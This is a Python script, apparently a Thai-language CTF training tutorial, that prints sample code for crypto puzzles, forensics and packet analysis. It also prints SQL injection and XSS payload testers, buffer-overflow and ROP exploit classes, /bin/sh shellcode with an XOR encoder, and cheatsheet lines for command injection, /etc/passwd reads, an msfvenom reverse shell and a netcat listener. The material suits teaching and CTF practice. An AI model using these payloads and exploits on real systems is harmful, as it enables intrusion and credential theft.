#!/usr/bin/env python3
"""
🎓 CTF & HACKING MASTERCLASS 2025
=================================
📚 คู่มือเทพ สำหรับผู้เริ่มต้นจนถึงระดับสูง
🔥 เทคนิคลับที่เซียนใช้จริงในการแข่ง CTF
⚠️ Educational Purpose Only!
"""

import base64
import hashlib
import requests
import subprocess
import re
import socket
import struct
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import string

class CTFMasterclass:
    def __init__(self):
        self.alphabet = string.ascii_lowercase
        self.techniques = []
        
    def cryptography_techniques(self):
        """🔐 เทคนิค Cryptography สำหรับ CTF"""
        print("🔐 CRYPTOGRAPHY TECHNIQUES")
        print("=" * 40)
        
        # 1. Caesar Cipher
        print("\n1. 🔤 Caesar Cipher")
        print("Code:")
        caesar_code = '''
def caesar_cipher(text, shift):
    result = ""
    for char in text.upper():
        if char.isalpha():
            result += chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
        else:
            result += char
    return result

def caesar_bruteforce(ciphertext):
    """ลองทุก shift 0-25"""
    for shift in range(26):
        decrypted = caesar_cipher(ciphertext, -shift)
        print(f"Shift {shift:2d}: {decrypted}")

# ตัวอย่าง
cipher = "WKLV LV D VHFUHW"
caesar_bruteforce(cipher)
        '''
        print(caesar_code)
        
        # 2. Base64 Multi-layer
        print("\n2. 📦 Base64 Multi-layer Encoding")
        print("Code:")
        base64_code = '''
import base64

def base64_multilayer_decode(data, max_layers=10):
    """ถอดรหัส Base64 หลายชั้น"""
    current = data
    layer = 0
    
    while layer < max_layers:
        try:
            # ลองถอดรหัส Base64
            decoded = base64.b64decode(current)
            
            # ตรวจสอบว่าเป็น ASCII text หรือไม่
            if all(32 <= b <= 126 for b in decoded):
                decoded_str = decoded.decode('ascii')
                print(f"Layer {layer + 1}: {decoded_str}")
                
                # ตรวจสอบว่ายังเป็น Base64 อีกไหม
                if re.match(r'^[A-Za-z0-9+/]*={0,2}$', decoded_str):
                    current = decoded_str
                    layer += 1
                else:
                    print(f"Final result: {decoded_str}")
                    return decoded_str
            else:
                print(f"Binary data at layer {layer + 1}")
                return current
                
        except Exception as e:
            print(f"Decoding stopped at layer {layer}: {e}")
            return current
    
    return current

# ตัวอย่าง
nested_b64 = "VDJadmJHOXVaM1pwYm1WdllXeHBjMnM9"
base64_multilayer_decode(nested_b64)
        '''
        print(base64_code)
        
        # 3. ROT13 และ variants
        print("\n3. 🔄 ROT Ciphers")
        print("Code:")
        rot_code = '''
def rot_n(text, n):
    """ROT-N cipher"""
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + n) % 26 + base)
        else:
            result += char
    return result

def rot_bruteforce(text):
    """ลอง ROT ทุกค่า"""
    for i in range(1, 26):
        decoded = rot_n(text, i)
        print(f"ROT{i:2d}: {decoded}")

# ROT13 (ใช้บ่อยใน CTF)
text = "Guvf vf n frperg zrffntr"
print("ROT13:", rot_n(text, 13))
        '''
        print(rot_code)
        
        # 4. XOR Encryption
        print("\n4. ⚡ XOR Encryption")
        print("Code:")
        xor_code = '''
def xor_encrypt(data, key):
    """XOR encryption/decryption"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    
    return bytes(result)

def xor_single_byte_bruteforce(ciphertext):
    """Brute force XOR กับ single byte"""
    for key in range(256):
        decrypted = xor_encrypt(ciphertext, bytes([key]))
        try:
            text = decrypted.decode('ascii')
            if all(c.isprintable() for c in text):
                print(f"Key {key:3d} (0x{key:02x}): {text}")
        except:
            pass

def find_xor_key_frequency(ciphertext):
    """หา XOR key ด้วย frequency analysis"""
    # สมมติว่า plaintext มี space เยอะ (ASCII 32)
    possible_keys = []
    for i in range(len(ciphertext)):
        possible_key = ciphertext[i] ^ ord(' ')
        possible_keys.append(possible_key)
    
    # หา key ที่เกิดขึ้นบ่อยที่สุด
    from collections import Counter
    key_counts = Counter(possible_keys)
    most_likely_key = key_counts.most_common(1)[0][0]
    
    decrypted = xor_encrypt(ciphertext, bytes([most_likely_key]))
    return most_likely_key, decrypted

# ตัวอย่าง
cipher_hex = "1a0e1c0e1b1f1a0e1c0e1b1f"
cipher_bytes = bytes.fromhex(cipher_hex)
xor_single_byte_bruteforce(cipher_bytes)
        '''
        print(xor_code)

    def web_exploitation_techniques(self):
        """🕷️ เทคนิค Web Exploitation"""
        print("\n🕷️ WEB EXPLOITATION TECHNIQUES")
        print("=" * 40)
        
        # 1. SQL Injection Advanced
        print("\n1. 💉 Advanced SQL Injection")
        print("Code:")
        sqli_code = '''
import requests
import time

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def time_based_blind_sqli(self, param, delay=5):
        """Time-based Blind SQL Injection"""
        # MySQL time delay payload
        payload = f"1' AND (SELECT SLEEP({delay})) AND '1'='1"
        
        data = {param: payload}
        start_time = time.time()
        
        try:
            response = self.session.post(self.target, data=data, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed >= delay:
                print(f"[+] Time-based SQLi detected! Delay: {elapsed:.2f}s")
                return True
            else:
                print(f"[-] No delay detected. Time: {elapsed:.2f}s")
                return False
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def union_based_sqli(self, param):
        """Union-based SQL Injection"""
        # หาจำนวน columns
        for i in range(1, 10):
            union_payload = f"1' UNION SELECT {','.join(['NULL'] * i)}-- "
            data = {param: union_payload}
            
            try:
                response = self.session.post(self.target, data=data)
                if "error" not in response.text.lower():
                    print(f"[+] Found {i} columns")
                    
                    # ลองดึงข้อมูล
                    info_payload = f"1' UNION SELECT {','.join(['NULL'] * (i-3))},user(),database(),version()-- "
                    data[param] = info_payload
                    info_response = self.session.post(self.target, data=data)
                    print(f"[+] Database info response length: {len(info_response.text)}")
                    return i
                    
            except Exception as e:
                continue
        
        print("[-] Union injection failed")
        return None
    
    def boolean_based_blind(self, param):
        """Boolean-based Blind SQL Injection"""
        # True condition
        true_payload = f"1' AND '1'='1"
        false_payload = f"1' AND '1'='2"
        
        true_response = self.session.post(self.target, data={param: true_payload})
        false_response = self.session.post(self.target, data={param: false_payload})
        
        if len(true_response.text) != len(false_response.text):
            print("[+] Boolean-based Blind SQLi detected!")
            return True
        else:
            print("[-] No boolean injection detected")
            return False

# ตัวอย่างการใช้
# tester = SQLInjectionTester("http://target.com/login.php")
# tester.time_based_blind_sqli("username")
        '''
        print(sqli_code)
        
        # 2. XSS Advanced
        print("\n2. 🚨 Advanced XSS Techniques")
        print("Code:")
        xss_code = '''
class XSSPayloadGenerator:
    def __init__(self):
        self.payloads = []
    
    def generate_filter_bypass_payloads(self):
        """สร้าง XSS payloads ที่ bypass filters"""
        payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            
            # Case variation
            "<ScRiPt>alert('XSS')</ScRiPt>",
            
            # HTML encoding
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # URL encoding
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # Double encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # JavaScript protocols
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Filter bypass techniques
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=\"javascript:alert('XSS')\">",
            "<iframe src=javascript:alert('XSS')></iframe>",
            
            # DOM-based
            "<img src=# onclick=alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            
            # Polyglot payloads
            "'\";alert('XSS');//",
            "';alert('XSS');//",
            "\");alert('XSS');//",
            
            # WAF bypass
            "<svg/onload=alert('XSS')>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",  # base64
        ]
        
        return payloads
    
    def test_xss_payloads(self, target_url, param):
        """ทดสอบ XSS payloads"""
        payloads = self.generate_filter_bypass_payloads()
        
        for i, payload in enumerate(payloads):
            data = {param: payload}
            try:
                response = requests.post(target_url, data=data)
                if payload in response.text:
                    print(f"[+] XSS Payload {i+1} reflected: {payload}")
                else:
                    print(f"[-] Payload {i+1} filtered")
            except:
                print(f"[-] Error with payload {i+1}")

# ตัวอย่าง
# xss = XSSPayloadGenerator()
# xss.test_xss_payloads("http://target.com/search.php", "q")
        '''
        print(xss_code)

    def reverse_engineering_techniques(self):
        """🔧 เทคนิค Reverse Engineering"""
        print("\n🔧 REVERSE ENGINEERING TECHNIQUES")
        print("=" * 40)
        
        # 1. Binary Analysis
        print("\n1. 🔍 Binary Analysis Basics")
        print("Code:")
        re_code = '''
import struct
import subprocess

class BinaryAnalyzer:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        
    def analyze_elf_header(self):
        """วิเคราะห์ ELF header"""
        with open(self.binary_path, 'rb') as f:
            header = f.read(64)  # ELF header size
            
            # ELF magic
            if header[:4] != b'\\x7fELF':
                print("Not an ELF file")
                return
            
            # Class (32/64 bit)
            bit_class = "32-bit" if header[4] == 1 else "64-bit"
            
            # Endianness
            endian = "little-endian" if header[5] == 1 else "big-endian"
            
            # Entry point (different offsets for 32/64-bit)
            if header[4] == 1:  # 32-bit
                entry_point = struct.unpack('<I', header[24:28])[0]
            else:  # 64-bit
                entry_point = struct.unpack('<Q', header[24:32])[0]
            
            print(f"ELF Analysis:")
            print(f"  Class: {bit_class}")
            print(f"  Endianness: {endian}")
            print(f"  Entry point: 0x{entry_point:x}")
    
    def extract_strings(self, min_length=4):
        """ดึง strings จาก binary"""
        try:
            result = subprocess.run(['strings', '-n', str(min_length), self.binary_path], 
                                  capture_output=True, text=True)
            strings = result.stdout.strip().split('\\n')
            
            print(f"Found {len(strings)} strings:")
            for s in strings[:20]:  # แสดง 20 อันแรก
                print(f"  {s}")
                
            return strings
        except:
            print("'strings' command not available")
            return []
    
    def disassemble_function(self, function_name):
        """Disassemble function ด้วย objdump"""
        try:
            cmd = ['objdump', '-d', '--disassemble=' + function_name, self.binary_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(f"Disassembly of {function_name}:")
            print(result.stdout)
        except:
            print("objdump not available")

# ตัวอย่าง
# analyzer = BinaryAnalyzer("./target_binary")
# analyzer.analyze_elf_header()
# analyzer.extract_strings()
        '''
        print(re_code)
        
        # 2. Python Bytecode Analysis
        print("\n2. 🐍 Python Bytecode Analysis")
        print("Code:")
        python_re_code = '''
import dis
import marshal
import py_compile

def analyze_pyc_file(pyc_path):
    """วิเคราะห์ .pyc file"""
    with open(pyc_path, 'rb') as f:
        # Skip magic number and timestamp
        f.read(12)  # Python 3.6+
        
        # Read code object
        code_obj = marshal.load(f)
        
        print("Bytecode Analysis:")
        dis.dis(code_obj)
        
        print("\\nCode object details:")
        print(f"  Filename: {code_obj.co_filename}")
        print(f"  Function name: {code_obj.co_name}")
        print(f"  Constants: {code_obj.co_consts}")
        print(f"  Names: {code_obj.co_names}")
        print(f"  Variables: {code_obj.co_varnames}")

def decompile_simple_python(bytecode):
    """Decompile simple Python functions"""
    # นี่คือตัวอย่างง่ายๆ สำหรับ educational
    print("Attempting to reconstruct source:")
    
    # วิเคราะห์ patterns ใน bytecode
    if 'LOAD_CONST' in str(bytecode) and 'RETURN_VALUE' in str(bytecode):
        print("  Likely returns a constant")
    
    if 'LOAD_FAST' in str(bytecode) and 'BINARY_ADD' in str(bytecode):
        print("  Likely performs addition")
    
    if 'CALL_FUNCTION' in str(bytecode):
        print("  Contains function calls")

# สร้าง sample pyc สำหรับทดสอบ
sample_code = '''
def secret_function(x, y):
    return x + y + 42
'''

with open('sample.py', 'w') as f:
    f.write(sample_code)

py_compile.compile('sample.py', 'sample.pyc')
analyze_pyc_file('sample.pyc')
        '''
        print(python_re_code)

    def pwn_exploitation_techniques(self):
        """💥 เทคนิค PWN/Binary Exploitation"""
        print("\n💥 PWN/BINARY EXPLOITATION")
        print("=" * 40)
        
        # 1. Buffer Overflow
        print("\n1. 📊 Buffer Overflow Basics")
        print("Code:")
        pwn_code = '''
from pwn import *

class BufferOverflowExploit:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = ELF(binary_path)
        
    def find_offset(self, crash_input_length=200):
        """หา offset สำหรับ overflow"""
        # สร้าง cyclic pattern
        pattern = cyclic(crash_input_length)
        
        # รัน binary กับ pattern
        p = process(self.binary)
        p.sendline(pattern)
        p.wait()
        
        # อ่าน core dump
        core = p.corefile
        stack = core.read(core.esp, 4)
        offset = cyclic_find(stack)
        
        print(f"Offset found: {offset}")
        return offset
    
    def ret2win_exploit(self, win_function_addr, offset):
        """Basic ret2win exploit"""
        payload = b"A" * offset
        payload += p32(win_function_addr)  # Overwrite return address
        
        p = process(self.binary)
        p.sendline(payload)
        p.interactive()
    
    def ret2libc_exploit(self, offset):
        """ret2libc exploit"""
        # หา addresses
        system_addr = self.elf.plt['system']
        exit_addr = self.elf.plt['exit']
        binsh_addr = next(self.elf.search(b'/bin/sh'))
        
        payload = b"A" * offset
        payload += p32(system_addr)  # system()
        payload += p32(exit_addr)    # exit() (return address)
        payload += p32(binsh_addr)   # "/bin/sh" argument
        
        p = process(self.binary)
        p.sendline(payload)
        p.interactive()
    
    def rop_chain_exploit(self, offset):
        """ROP chain exploit"""
        rop = ROP(self.elf)
        rop.system(next(self.elf.search(b'/bin/sh')))
        
        payload = b"A" * offset
        payload += rop.chain()
        
        p = process(self.binary)
        p.sendline(payload)
        p.interactive()

# ตัวอย่าง
# exploit = BufferOverflowExploit("./vuln_binary")
# offset = exploit.find_offset()
# exploit.ret2win_exploit(0x08048456, offset)
        '''
        print(pwn_code)
        
        # 2. Shellcode Development
        print("\n2. 🐚 Shellcode Development")
        print("Code:")
        shellcode_code = '''
def generate_shellcode():
    """สร้าง shellcode สำหรับ Linux x86"""
    
    # execve("/bin/sh", NULL, NULL) shellcode
    shellcode = (
        "\\x31\\xc0"          # xor eax, eax
        "\\x50"              # push eax
        "\\x68\\x2f\\x2f\\x73\\x68"  # push "//sh"
        "\\x68\\x2f\\x62\\x69\\x6e"  # push "/bin"
        "\\x89\\xe3"          # mov ebx, esp
        "\\x50"              # push eax
        "\\x53"              # push ebx
        "\\x89\\xe1"          # mov ecx, esp
        "\\x31\\xd2"          # xor edx, edx
        "\\xb0\\x0b"          # mov al, 11 (execve syscall)
        "\\xcd\\x80"          # int 0x80
    )
    
    return shellcode

def test_shellcode(shellcode):
    """ทดสอบ shellcode"""
    from pwn import *
    
    # สร้าง ELF จาก shellcode
    context.arch = 'i386'
    elf = make_elf(shellcode)
    
    # รัน
    p = process(elf.path)
    p.interactive()

# Bad characters check
def check_bad_chars(shellcode, bad_chars="\\x00\\x0a\\x0d"):
    """ตรวจสอบ bad characters ใน shellcode"""
    for bad in bad_chars:
        if bad.encode() in shellcode:
            print(f"Bad character found: {bad}")
            return False
    print("No bad characters found")
    return True

# Shellcode encoder (simple XOR)
def encode_shellcode(shellcode, key=0x42):
    """เข้ารหัส shellcode ด้วย XOR"""
    encoded = b""
    for byte in shellcode:
        encoded += bytes([byte ^ key])
    
    # Decoder stub
    decoder = (
        f"    mov esi, encoded_shellcode\\n"
        f"    mov ecx, {len(shellcode)}\\n"
        f"decode_loop:\\n"
        f"    xor byte [esi], {key}\\n"
        f"    inc esi\\n"
        f"    loop decode_loop\\n"
        f"    jmp encoded_shellcode\\n"
        f"encoded_shellcode:\\n"
    )
    
    return encoded, decoder

shellcode = generate_shellcode()
print(f"Shellcode length: {len(shellcode)}")
check_bad_chars(shellcode)
        '''
        print(shellcode_code)

    def forensics_techniques(self):
        """🔍 เทคนิค Digital Forensics"""
        print("\n🔍 DIGITAL FORENSICS TECHNIQUES")
        print("=" * 40)
        
        # 1. File Analysis
        print("\n1. 📁 File Analysis")
        print("Code:")
        forensics_code = '''
import os
import hashlib
import struct
from PIL import Image
from PIL.ExifTags import TAGS

class ForensicsAnalyzer:
    def __init__(self, file_path):
        self.file_path = file_path
        
    def file_signature_check(self):
        """ตรวจสอบ file signature"""
        signatures = {
            b'\\x89PNG\\r\\n\\x1a\\n': 'PNG Image',
            b'\\xff\\xd8\\xff': 'JPEG Image',
            b'GIF87a': 'GIF Image (87a)',
            b'GIF89a': 'GIF Image (89a)',
            b'PK\\x03\\x04': 'ZIP Archive',
            b'\\x50\\x4b\\x05\\x06': 'ZIP Archive (empty)',
            b'\\x7fELF': 'ELF Executable',
            b'MZ': 'Windows Executable',
            b'\\xd0\\xcf\\x11\\xe0': 'Microsoft Office Document',
            b'%PDF': 'PDF Document'
        }
        
        with open(self.file_path, 'rb') as f:
            header = f.read(16)
            
        for sig, file_type in signatures.items():
            if header.startswith(sig):
                print(f"File type detected: {file_type}")
                return file_type
        
        print("Unknown file type")
        return None
    
    def calculate_hashes(self):
        """คำนวณ hash values"""
        hash_algorithms = {
            'MD5': hashlib.md5(),
            'SHA1': hashlib.sha1(),
            'SHA256': hashlib.sha256()
        }
        
        with open(self.file_path, 'rb') as f:
            data = f.read()
            
        for name, hasher in hash_algorithms.items():
            hasher.update(data)
            print(f"{name}: {hasher.hexdigest()}")
    
    def extract_image_metadata(self):
        """ดึง metadata จากรูปภาพ"""
        try:
            image = Image.open(self.file_path)
            exifdata = image.getexif()
            
            print("Image EXIF Data:")
            for tag_id in exifdata:
                tag = TAGS.get(tag_id, tag_id)
                data = exifdata.get(tag_id)
                print(f"  {tag}: {data}")
                
        except Exception as e:
            print(f"Error extracting image metadata: {e}")
    
    def search_hidden_data(self):
        """ค้นหาข้อมูลที่ซ่อนอยู่"""
        with open(self.file_path, 'rb') as f:
            content = f.read()
        
        # ค้นหา strings ที่น่าสนใจ
        patterns = [
            b'flag{',
            b'CTF{',
            b'password',
            b'secret',
            b'hidden',
            b'base64:',
            b'-----BEGIN',
            b'ssh-rsa'
        ]
        
        print("Searching for hidden data:")
        for pattern in patterns:
            if pattern in content:
                index = content.find(pattern)
                surrounding = content[max(0, index-20):index+50]
                print(f"  Found '{pattern.decode()}' at offset {index}")
                print(f"    Context: {surrounding}")
    
    def analyze_file_structure(self):
        """วิเคราะห์โครงสร้างไฟล์"""
        file_size = os.path.getsize(self.file_path)
        print(f"File size: {file_size} bytes")
        
        # ตรวจสอบ entropy (สำหรับหาข้อมูลที่เข้ารหัส)
        with open(self.file_path, 'rb') as f:
            data = f.read()
        
        # คำนวณ entropy แบบง่าย
        from collections import Counter
        import math
        
        byte_counts = Counter(data)
        entropy = 0
        for count in byte_counts.values():
            probability = count / len(data)
            entropy -= probability * math.log2(probability)
        
        print(f"File entropy: {entropy:.2f}")
        if entropy > 7.5:
            print("  High entropy - possibly encrypted/compressed")
        elif entropy < 3:
            print("  Low entropy - possibly text or simple data")

# Steganography detection
def detect_steganography(image_path):
    """ตรวจจับ steganography ในรูปภาพ"""
    try:
        img = Image.open(image_path)
        pixels = img.load()
        width, height = img.size
        
        # ตรวจสอบ LSB patterns
        lsb_data = []
        for y in range(height):
            for x in range(width):
                if img.mode == 'RGB':
                    r, g, b = pixels[x, y]
                    lsb_data.extend([r & 1, g & 1, b & 1])
                elif img.mode == 'L':  # Grayscale
                    lsb_data.append(pixels[x, y] & 1)
        
        # แปลง LSB เป็น string
        lsb_string = ''.join(map(str, lsb_data[:800]))  # เช็คแค่ส่วนแรก
        
        # ลองแปลง binary เป็น text
        try:
            for i in range(0, len(lsb_string)-8, 8):
                byte_str = lsb_string[i:i+8]
                if len(byte_str) == 8:
                    char_code = int(byte_str, 2)
                    if 32 <= char_code <= 126:  # Printable ASCII
                        print(f"Possible hidden character: {chr(char_code)}")
        except:
            pass
            
    except Exception as e:
        print(f"Error analyzing steganography: {e}")

# ตัวอย่าง
# analyzer = ForensicsAnalyzer("suspicious_file.jpg")
# analyzer.file_signature_check()
# analyzer.calculate_hashes()
# analyzer.extract_image_metadata()
# analyzer.search_hidden_data()
# detect_steganography("suspicious_file.jpg")
        '''
        print(forensics_code)

    def network_analysis_techniques(self):
        """🌐 เทคนิค Network Analysis"""
        print("\n🌐 NETWORK ANALYSIS TECHNIQUES")
        print("=" * 40)
        
        # 1. Packet Analysis
        print("\n1. 📦 Packet Analysis")
        print("Code:")
        network_code = '''
import socket
import struct
from scapy.all import *

class NetworkAnalyzer:
    def __init__(self):
        self.packets = []
        
    def analyze_pcap(self, pcap_file):
        """วิเคราะห์ PCAP file"""
        packets = rdpcap(pcap_file)
        
        print(f"Total packets: {len(packets)}")
        
        protocols = {}
        for packet in packets:
            if packet.haslayer(IP):
                protocol = packet[IP].proto
                protocols[protocol] = protocols.get(protocol, 0) + 1
        
        print("Protocol distribution:")
        for proto, count in protocols.items():
            proto_name = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}.get(proto, f'Unknown({proto})')
            print(f"  {proto_name}: {count}")
        
        return packets
    
    def extract_http_data(self, packets):
        """ดึงข้อมูล HTTP"""
        http_packets = []
        
        for packet in packets:
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load
                
                if b'HTTP/' in payload or b'GET ' in payload or b'POST ' in payload:
                    http_packets.append(packet)
                    
                    # แยก HTTP headers
                    try:
                        payload_str = payload.decode('utf-8', errors='ignore')
                        lines = payload_str.split('\\r\\n')
                        
                        print(f"HTTP Packet from {packet[IP].src}:{packet[TCP].sport}")
                        for line in lines[:10]:  # แสดง 10 บรรทัดแรก
                            if line.strip():
                                print(f"  {line}")
                        print()
                        
                    except:
                        pass
        
        return http_packets
    
    def detect_suspicious_traffic(self, packets):
        """ตรวจจับ traffic ที่น่าสงสัย"""
        suspicious_indicators = {
            'port_scan': {},
            'large_uploads': [],
            'encrypted_tunnels': [],
            'dns_tunneling': []
        }
        
        for packet in packets:
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # ตรวจจับ port scanning
                if packet.haslayer(TCP):
                    dst_port = packet[TCP].dport
                    key = f"{src_ip}->{dst_ip}"
                    
                    if key not in suspicious_indicators['port_scan']:
                        suspicious_indicators['port_scan'][key] = set()
                    
                    suspicious_indicators['port_scan'][key].add(dst_port)
                
                # ตรวจจับ large data transfers
                if packet.haslayer(Raw) and len(packet[Raw].load) > 1000:
                    suspicious_indicators['large_uploads'].append({
                        'src': src_ip,
                        'dst': dst_ip,
                        'size': len(packet[Raw].load),
                        'time': packet.time
                    })
        
        # รายงานผล
        print("Suspicious Activity Report:")
        
        # Port scans
        for connection, ports in suspicious_indicators['port_scan'].items():
            if len(ports) > 10:  # สแกนมากกว่า 10 ports
                print(f"  Possible port scan: {connection} -> {len(ports)} ports")
        
        # Large uploads
        if suspicious_indicators['large_uploads']:
            print(f"  Large data transfers: {len(suspicious_indicators['large_uploads'])} detected")
    
    def extract_credentials(self, packets):
        """ดึงข้อมูล credentials จาก plaintext protocols"""
        credentials = []
        
        for packet in packets:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                try:
                    payload_str = payload.decode('utf-8', errors='ignore').lower()
                    
                    # FTP credentials
                    if 'user ' in payload_str or 'pass ' in payload_str:
                        print(f"FTP Credential found: {payload_str.strip()}")
                        credentials.append(('FTP', payload_str.strip()))
                    
                    # HTTP Basic Auth
                    if 'authorization: basic' in payload_str:
                        auth_line = [line for line in payload_str.split('\\n') if 'authorization: basic' in line][0]
                        encoded_creds = auth_line.split('basic ')[1].strip()
                        try:
                            decoded_creds = base64.b64decode(encoded_creds).decode()
                            print(f"HTTP Basic Auth: {decoded_creds}")
                            credentials.append(('HTTP', decoded_creds))
                        except:
                            pass
                    
                    # Telnet (simple pattern matching)
                    if 'login:' in payload_str or 'password:' in payload_str:
                        print(f"Telnet activity: {payload_str.strip()}")
                        credentials.append(('Telnet', payload_str.strip()))
                
                except:
                    pass
        
        return credentials

# DNS Tunneling Detection
def detect_dns_tunneling(packets):
    """ตรวจจับ DNS tunneling"""
    dns_queries = []
    
    for packet in packets:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
            query_name = packet[DNS].qd.qname.decode()
            
            # ตรวจสอบความผิดปกติ
            if len(query_name) > 50:  # ชื่อยาวผิดปกติ
                print(f"Suspicious long DNS query: {query_name}")
            
            # ตรวจสอบรูปแบบข้อมูล encoded
            if re.match(r'^[a-f0-9]{32,}', query_name):  # Hex pattern
                print(f"Possible hex-encoded DNS query: {query_name}")
            
            dns_queries.append(query_name)
    
    return dns_queries

# ตัวอย่าง
# analyzer = NetworkAnalyzer()
# packets = analyzer.analyze_pcap("capture.pcap")
# analyzer.extract_http_data(packets)
# analyzer.detect_suspicious_traffic(packets)
# analyzer.extract_credentials(packets)
        '''
        print(network_code)

    def generate_ctf_cheatsheet(self):
        """สร้าง cheatsheet สำหรับ CTF"""
        cheatsheet = {
            "Cryptography": {
                "Base64": "echo 'data' | base64 -d",
                "ROT13": "echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
                "MD5": "echo -n 'text' | md5sum",
                "SHA256": "echo -n 'text' | sha256sum",
                "Hex decode": "echo 'hex_string' | xxd -r -p",
                "Caesar cipher": "python -c \"print(''.join(chr((ord(c)-ord('a')+shift)%26+ord('a')) for c in 'ciphertext'))\""
            },
            
            "Web Exploitation": {
                "SQL Injection": "' OR '1'='1' --",
                "XSS": "<script>alert('XSS')</script>",
                "Command Injection": "; cat /etc/passwd",
                "Directory Traversal": "../../../etc/passwd",
                "PHP LFI": "?file=php://filter/convert.base64-encode/resource=index.php"
            },
            
            "Binary Exploitation": {
                "Find offset": "python -c \"from pwn import *; print(cyclic(200))\"",
                "Pack address": "python -c \"from pwn import *; print(p32(0x08048456))\"",
                "Generate shellcode": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python",
                "Disassemble": "objdump -d binary_file",
                "Strings": "strings binary_file"
            },
            
            "Forensics": {
                "File type": "file suspicious_file",
                "Hex dump": "xxd suspicious_file | head -20",
                "Image metadata": "exiftool image.jpg",
                "Steganography": "steghide extract -sf image.jpg",
                "Zip password": "fcrackzip -D -p rockyou.txt archive.zip",
                "Binwalk": "binwalk -e firmware.bin"
            },
            
            "Network Analysis": {
                "Wireshark filters": "http.request.method==POST && ip.addr==192.168.1.1",
                "Extract HTTP": "tshark -r capture.pcap -Y http -T fields -e http.request.full_uri",
                "Extract files": "foremost -i capture.pcap",
                "TCP stream": "tshark -r capture.pcap -z follow,tcp,ascii,0"
            },
            
            "Useful Tools": {
                "Port scan": "nmap -sC -sV target_ip",
                "Web scan": "gobuster dir -u http://target.com -w wordlist.txt",
                "Hash identify": "hashid hash_string",
                "Online decoder": "CyberChef (gchq.github.io/CyberChef/)",
                "Reverse shell": "nc -lvnp 4444"
            }
        }
        
        print("\n🎯 CTF CHEATSHEET")
        print("=" * 50)
        
        for category, commands in cheatsheet.items():
            print(f"\n📋 {category}:")
            print("-" * (len(category) + 4))
            
            for name, command in commands.items():
                print(f"  {name:20} : {command}")
        
        # บันทึกเป็นไฟล์
        with open('ctf_cheatsheet.json', 'w') as f:
            json.dump(cheatsheet, f, indent=2)
        
        return cheatsheet

def main_demo():
    """เรียกใช้ demo ทั้งหมด"""
    print("🎓 CTF & HACKING MASTERCLASS 2025")
    print("=" * 50)
    print("⚠️  EDUCATIONAL PURPOSE ONLY!")
    print("📚 เนื้อหาสำหรับการเรียนรู้และการแข่งขัน CTF")
    print()
    
    masterclass = CTFMasterclass()
    
    # เรียกใช้เทคนิคต่างๆ
    techniques = [
        masterclass.cryptography_techniques,
        masterclass.web_exploitation_techniques,
        masterclass.reverse_engineering_techniques,
        masterclass.pwn_exploitation_techniques,
        masterclass.forensics_techniques,
        masterclass.network_analysis_techniques
    ]
    
    for technique in techniques:
        try:
            technique()
            print("\n" + "="*60 + "\n")
            time.sleep(1)
        except Exception as e:
            print(f"❌ Error in technique: {e}")
    
    # สร้าง cheatsheet
    masterclass.generate_ctf_cheatsheet()
    
    print("\n🏆 LEARNING RESOURCES:")
    resources = [
        "OverTheWire Wargames - https://overthewire.org/wargames/",
        "PicoCTF - https://picoctf.org/",
        "Cryptohack - https://cryptohack.org/",
        "pwnable.kr - http://pwnable.kr/",
        "CTFtime - https://ctftime.org/",
        "Hack The Box - https://www.hackthebox.com/",
        "TryHackMe - https://tryhackme.com/",
        "SANS Cyber Aces - https://cyberaces.org/"
    ]
    
    for resource in resources:
        print(f"   • {resource}")
    
    print("\n🎯 PRO TIPS FOR CTF SUCCESS:")
    tips = [
        "อ่านโจทย์ให้ละเอียด - คำใบ้มักซ่อนอยู่ในโจทย์",
        "ลองเทคนิคง่ายๆ ก่อน - เช่น view-source, strings",
        "ใช้ CyberChef สำหรับ encode/decode ต่างๆ",
        "เก็บ payload และ technique ที่ได้ผลไว้",
        "ฝึกฝนกับ CTF ที่ผ่านมาใน CTFtime",
        "เรียนรู้จากทีมอื่นๆ ใน writeups",
        "ตั้งค่า VM สำหรับ CTF (Kali Linux)",
        "มี Python, pwntools พร้อมใช้เสมอ"
    ]
    
    for tip in tips:
        print(f"   • {tip}")

if __name__ == "__main__":
    main_demo()
